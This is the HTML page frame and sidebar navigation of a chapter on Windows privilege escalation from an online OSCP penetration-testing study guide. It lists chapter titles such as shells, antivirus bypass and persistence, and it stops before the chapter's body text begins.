<!DOCTYPE html>
<html lang="en"><head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
        <title>Privilege Escalation - Windows Â· Total OSCP Guide</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.2">
        <meta name="author" content="sushant747">
        
        
    
    <link rel="stylesheet" href="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/style.css">

    
            
                
                <link rel="stylesheet" href="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/plugin.css">
                
            
                
                <link rel="stylesheet" href="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/website.css">
                
            
                
                <link rel="stylesheet" href="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/search.css">
                
            
                
                <link rel="stylesheet" href="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/website_002.css">
                
            
        

    

    
        
        <link rel="stylesheet" href="Privilege%20Escalation%20-%20Windows%20%C2%B7%20Total%20OSCP%20Guide_files/website_003.css">
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://sushant747.gitbooks.io/total-oscp-guide/content/gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="https://sushant747.gitbooks.io/total-oscp-guide/content/gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="https://sushant747.gitbooks.io/total-oscp-guide/content/escaping_restricted_shell.html">
    
    
    <link rel="prev" href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">
    

    
<style>
    .book .book-summary .book-search,
    .book .book-summary ul.summary {
        position: relative;
        top: auto;
        left: auto;
        right: auto;
        bottom: auto;
    }
    .book-summary {
        display: -webkit-box;
        display: -moz-box;
        display: -ms-flexbox;
        display: -webkit-flex;
        display: flex;
        flex-direction: column;
        -webkit-box-orient: vertical;
        -webkit-box-direction: normal;
        overflow-y: auto;
    }
    .book-summary > nav {
        flex: 1 1 auto;
        overflow-y: auto;
        overflow-y: overlay;
    }
    .gl-wrapper {
        margin: 0;
        display: block;
        padding: 0;
        position: relative;
        line-height: 15px;
        background: #fafafa;
    }
    .gl-wrapper:before {
        background: -webkit-linear-gradient(to bottom, rgba(250,250,250,0) 0%, #fafafa 100%);
        background: -moz-linear-gradient(to bottom, rgba(250,250,250,0) 0%, #fafafa 100%);
        top: -24px;
        width: 100%;
        height: 24px;
        content: "";
        display: block;
        position: absolute;
        background: linear-gradient(to bottom, rgba(250,250,250,0) 0%, #fafafa 100%);
    }
    .book.color-theme-1 .gl-wrapper {
        background: #121212;
    }
    .book.color-theme-1 .gl-wrapper:before {
        background: -webkit-linear-gradient(to bottom, rgba(18,18,18,0) 0%, #121212 100%);
        background: -moz-linear-gradient(to bottom, rgba(18,18,18,0) 0%, #121212 100%);
        background: linear-gradient(to bottom, rgba(18,18,18,0) 0%, #121212 100%);
    }
    .book.color-theme-2 .gl-wrapper {
        background: #2e3243;
    }
    .book.color-theme-2 .gl-wrapper:before {
        background: -webkit-linear-gradient(to bottom, rgba(46,50,67,0) 0%, #2e3243 100%);
        background: -moz-linear-gradient(to bottom, rgba(46,50,67,0) 0%, #2e3243 100%);
        background: linear-gradient(to bottom, rgba(46,50,67,0) 0%, #2e3243 100%);
    }
    .gl-wrapper .gitbook-link {
        display: -webkit-box;
        display: -moz-box;
        display: -ms-flexbox;
        display: -webkit-flex;
        color: #9DAAB6;
        margin: 16px;
        display: flex;
        padding: 0;
        align-items: center;
        margin-left: 32px;
        padding-top: 8px;
        padding-left: 16px;
        border-radius: 3px;
        padding-right: 16px;
        padding-bottom: 8px;
        text-decoration: none;
        background-color: #E6ECF1;
        -webkit-box-align: center;
    }
    .gl-wrapper .tm-logo {
        margin: 0;
        display: block;
        padding: 0;
        font-size: 40px;
    }
    .gl-wrapper .tm-content {
        flex: 1;
        margin: 0;
        display: block;
        padding: 0;
        padding-left: 16px;
    }
    .gl-wrapper .tm-content .container {
        margin: 0;
        display: block;
        padding: 0;
    }
    .gl-wrapper .tm-content .tm-container .tm-text {
        font-size: 12px;
        font-family: "Roboto", sans-serif;
        font-weight: 400;
        line-height: 1.625;
    }
</style></head>
    <body>
        
<div class="book without-animation with-summary font-size-2 font-family-1">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search">
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="https://www.gitbook.com/book/sushant747/total-oscp-guide" target="_blank" class="custom-link">Total OSCP Guide</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="./">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="the_basics.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/the_basics.html">
            
                    
                    The Basics
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="linux.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/linux.html">
            
                    
                    Linux
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1.1" data-path="basics_of_linux.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/basics_of_linux.html">
            
                    
                    Basics of Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.2" data-path="bash-scripting.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bash-scripting.html">
            
                    
                    Bash-scripting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.1.3" data-path="vim.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/vim.html">
            
                    
                    Vim
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="windows.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/windows.html">
            
                    
                    Windows
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.2.1" data-path="basics_of_windows.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/basics_of_windows.html">
            
                    
                    Basics of Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.2" data-path="powershell.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/powershell.html">
            
                    
                    PowerShell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.3" data-path="powershell_scripting2.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/powershell_scripting2.html">
            
                    
                    PowerShell Scripting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.4" data-path="cmd.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/cmd.html">
            
                    
                    CMD
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="scripting_with_python.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/scripting_with_python.html">
            
                    
                    Scripting With Python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.3.1" data-path="python_fundamentals.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/python_fundamentals.html">
            
                    
                    Python Fundamentals
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3.2" data-path="connections.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/connections.html">
            
                    
                    Useful Scripts
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.4" data-path="transfering_files2.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files2.html">
            
                    
                    Transferring Files
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.4.1" data-path="transfering_files.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files.html">
            
                    
                    Transfering Files on Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.2" data-path="transfering_files_to_windows.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html">
            
                    
                    Transfering files on Windows
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="firewalls.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/firewalls.html">
            
                    
                    Firewalls
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="general_tips.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/general_tips.html">
            
                    
                    General tips and tricks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="scanning.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/scanning.html">
            
                    
                    Recon and Information Gathering Phase
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="passive_information_gatherig.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/passive_information_gatherig.html">
            
                    
                    Passive Information Gatherig
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1.1">
            
                <span>
            
                    
                    Identify IP-addresses and Subdomains
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1.1.1">
            
                <span>
            
                    
                    Identify IP-addresses
            
                </span>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.1.1.2" data-path="find_subdomains.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/find_subdomains.html">
            
                    
                    Find Subdomains
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1.1.2.1" data-path="dns_basics.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/dns_basics.html">
            
                    
                    DNS Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.1.1.2.2" data-path="finding_subdomains.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/finding_subdomains.html">
            
                    
                    Finding subdomains
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.1.1.2.3" data-path="dns_zone_transfer_attack.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/dns_zone_transfer_attack.html">
            
                    
                    DNS Zone Transfer Attack
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3.1.2" data-path="email_harvesting.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/email_harvesting.html">
            
                    
                    Identifying People
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.1.3" data-path="google_hacking.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/google_hacking.html">
            
                    
                    Search Engine Discovery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.1.4" data-path="identifying-technology-stack.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/identifying-technology-stack.html">
            
                    
                    Identifying Technology Stack
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="active_information_gathering.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/active_information_gathering.html">
            
                    
                    Active Information Gathering
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.2.1" data-path="port_scanning.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/port_scanning.html">
            
                    
                    Port Scanning
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="vulnerability_analysi1s.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/vulnerability_analysi1s.html">
            
                    
                    Vulnerability analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="server-side-vulnerabilities.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/server-side-vulnerabilities.html">
            
                    
                    Server-side Vulnerabilities
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1.1" data-path="list_of_common_ports.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/list_of_common_ports.html">
            
                    
                    Common ports\/services and how to use them
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.1.2" data-path="port_knocking.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html">
            
                    
                    Port Knocking
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="web-services.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/web-services.html">
            
                    
                    HTTP - Web Vulnerabilities
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.2.1" data-path="common_web-services.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/common_web-services.html">
            
                    
                    Common Web-services
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.2" data-path="waf_-_web_application_firewall.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/waf_-_web_application_firewall.html">
            
                    
                    WAF - Web Application Firewall
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3" data-path="lead_to_compromise.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/lead_to_compromise.html">
            
                    
                    Attacking the System
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.2.3.1" data-path="local_file_inclusion.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html">
            
                    
                    Local File Inclusion
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3.2" data-path="remote_file_inclusion.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html">
            
                    
                    Remote File Inclusion
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3.3" data-path="web-scanning.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/web-scanning.html">
            
                    
                    Hidden Files and Directories
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3.4" data-path="sql-injections.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html">
            
                    
                    SQL-Injections
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3.5" data-path="nosql-injections.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/nosql-injections.html">
            
                    
                    Nosql-Injections
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3.6" data-path="xml_external_entity_attack.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/xml_external_entity_attack.html">
            
                    
                    XML External Entity Attack
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3.7" data-path="bypass_image_upload.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">
            
                    
                    Bypass File Upload Filtering
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3.8" data-path="exposed_version_control.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/exposed_version_control.html">
            
                    
                    Exposed Version Control
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.3.9" data-path="failure-to-restrict-url-access.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/failure-to-restrict-url-access.html">
            
                    
                    Failure to Restrict URL Access
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.2.4" data-path="attacking_the_user.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/attacking_the_user.html">
            
                    
                    Attacking the User
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.2.4.1" data-path="clickjacking.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/clickjacking.html">
            
                    
                    Clickjacking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4.2" data-path="broken_authentication_or_session_management.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/broken_authentication_or_session_management.html">
            
                    
                    Broken Authentication or Session Management
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4.3" data-path="text-injection.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/text-injection.html">
            
                    
                    Text\/content-injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4.4" data-path="subdomain_takeover.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/subdomain_takeover.html">
            
                    
                    Subdomain Takeover
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4.5" data-path="cross_site_request_forgery.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/cross_site_request_forgery.html">
            
                    
                    Cross Site Request Forgery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4.6" data-path="cross-site-scripting.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/cross-site-scripting.html">
            
                    
                    Cross-site-scripting
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.2.4.6.1" data-path="examplesXSS.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/examplesXSS.html">
            
                    
                    Examples
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.2.4.7" data-path="browser_vulnerabilities.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/browser_vulnerabilities.html">
            
                    
                    Browser Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2.4.8" data-path="java_applet.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/java_applet.html">
            
                    
                    Java Applet
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="automated_vulnerability_scanners.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/automated_vulnerability_scanners.html">
            
                    
                    Automated Vulnerability Scanners
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="exploiting.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/exploiting.html">
            
                    
                    Exploiting
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="social_engineering_-_phishing.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/social_engineering_-_phishing.html">
            
                    
                    Social Engineering - Phishing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="default_layout_apache_on_different_versiont.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/default_layout_apache_on_different_versiont.html">
            
                    
                    Default Layout of Apache on Different Versions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="reverse-shell.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html">
            
                    
                    Shells
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="webshell.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html">
            
                    
                    Webshell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="create_shellcode.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/create_shellcode.html">
            
                    
                    Generate Shellcode
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6" data-path="editing-exploits.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/editing-exploits.html">
            
                    
                    Editing Exploits
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.7" data-path="compiling-windows-exploits.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/compiling-windows-exploits.html">
            
                    
                    Compiling windows exploits
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="post_exploitation.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/post_exploitation.html">
            
                    
                    Post Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="spawning_shells.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html">
            
                    
                    Spawning Shells
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.2" data-path="getting_meterpreter_shell.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/getting_meterpreter_shell.html">
            
                    
                    Meterpreter for Post-Exploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.3" data-path="privilege_escalation_-_linux.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">
            
                    
                    Privilege Escalation - Linux
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.6.4" data-path="privilege_escalation_windows.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html">
            
                    
                    Privilege Escalation - Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.5" data-path="escaping_restricted_shell.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/escaping_restricted_shell.html">
            
                    
                    Escaping Restricted Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.6" data-path="bypassing_antivirus.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html">
            
                    
                    Bypassing antivirus
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.7" data-path="loot.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/loot.html">
            
                    
                    Loot and Enumerate
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.7.1" data-path="loot_windows_-_for_credentials_and_other_stuff.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/loot_windows_-_for_credentials_and_other_stuff.html">
            
                    
                    Loot Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.7.2" data-path="tcp-dumps_on_pwnd_machines.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/tcp-dumps_on_pwnd_machines.html">
            
                    
                    Loot Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6.8" data-path="persistence.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/persistence.html">
            
                    
                    Persistence
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6.9" data-path="clean_up.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/clean_up.html">
            
                    
                    Cover your tracks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="password-cracking.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/password-cracking.html">
            
                    
                    Password Cracking
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="generate_custom_wordlist.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/generate_custom_wordlist.html">
            
                    
                    Generate Custom Wordlist
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.2" data-path="identify_hash_and_crack_it.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/identify_hash_and_crack_it.html">
            
                    
                    Offline Password Cracking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3" data-path="online_password_cracking.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/online_password_cracking.html">
            
                    
                    Online Password Cracking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.4" data-path="pass_the_hash_-_reusing_hashes.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/pass_the_hash_-_reusing_hashes.html">
            
                    
                    Pass the Hash - Reusing Hashes
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="port_forwarding_and_tunneling.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/port_forwarding_and_tunneling.html">
            
                    
                    Pivoting - Port forwarding - Tunneling
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9" data-path="network_traffic.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/network_traffic.html">
            
                    
                    Network traffic analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.9.1" data-path="arp-spoofing.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/arp-spoofing.html">
            
                    
                    Arp-spoofing
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.9.1.1" data-path="ssl-strip.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/ssl-strip.html">
            
                    
                    SSL-strip
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.9.2" data-path="dns-spoofing.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/dns-spoofing.html">
            
                    
                    DNS-spoofing
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9.3" data-path="wireshark.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/wireshark.html">
            
                    
                    Wireshark
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.10" data-path="wifi.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/wifi.html">
            
                    
                    Wifi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.10.1" data-path="wep.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/wep.html">
            
                    
                    WEP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.10.2" data-path="wps.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/wps.html">
            
                    
                    WPS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.11" data-path="physical_access_to_machine.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/physical_access_to_machine.html">
            
                    
                    Physical access to machine
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.12" data-path="littearature.html">
            
                <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/littearature.html">
            
                    
                    Literature
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    
</ul>


                </nav>
            
        
    
<div class="gl-wrapper">
    <a class="gitbook-link" href="https://www.gitbook.com/?utm_source=public_site_legacy&amp;utm_medium=referral&amp;utm_campaign=trademark&amp;utm_term=sushant747&amp;utm_content=powered_by" target="blank">
        <div class="tm-logo">
            <svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="currentColor" viewBox="0 0 1067 769" xmlns="http://www.w3.org/2000/svg" stroke="none" class="icon-7f6730be--text-3f89f380"><g><path d="M480.026 640.677c17.205 0 31.2 13.997 31.2 31.194s-13.995 31.193-31.2 31.193c-17.197 0-31.193-13.996-31.193-31.193 0-17.197 13.996-31.194 31.193-31.194m489.93-193.226c-17.203 0-31.2-13.998-31.2-31.195 0-17.204 13.997-31.2 31.2-31.2 17.198 0 31.194 13.996 31.194 31.2 0 17.197-13.996 31.195-31.193 31.195m0-127.804c-53.269 0-96.609 43.34-96.609 96.609 0 10.373 1.723 20.702 5.123 30.741L559.328 616.879c-18.132-26.128-47.521-41.617-79.302-41.617-36.821 0-70.391 21.065-86.63 54.003L106.68 478.109c-30.288-15.927-52.965-65.817-50.56-111.223 1.248-23.687 9.438-42.071 21.897-49.17 7.916-4.493 17.436-4.099 27.526 1.188l1.916 1.01c75.96 40.022 324.6 170.981 335.063 175.844 16.157 7.47 25.14 10.5 52.659-2.547l513.958-267.3c7.53-2.844 16.315-10.062 16.315-21.023 0-15.205-15.72-21.199-15.765-21.199-29.218-14.018-74.163-35.054-117.987-55.57C798.033 84.26 691.861 34.547 645.23 10.132c-40.253-21.072-72.655-3.311-78.432.282l-11.227 5.555C345.727 119.743 64.898 258.826 48.911 268.553 20.278 285.973 2.547 320.679.252 363.768c-3.586 68.304 31.261 139.506 81.069 165.634l303.172 156.354c6.83 47.306 47.55 82.725 95.532 82.725 52.78 0 95.808-42.546 96.603-95.14L910.541 492.38c16.93 13.233 37.92 20.486 59.416 20.486 53.268 0 96.61-43.341 96.61-96.61s-43.342-96.61-96.61-96.61" fill-rule="evenodd"></path></g></svg>
        </div>
        <div class="tm-content">
            <div class="tm-container">
                <span class="tm-text">
                    Powered by <b>GitBook</b>
                </span>
            </div>
        </div>
    </a>
</div></div>

    <div class="book-body">
        
            <div class="body-inner">
                
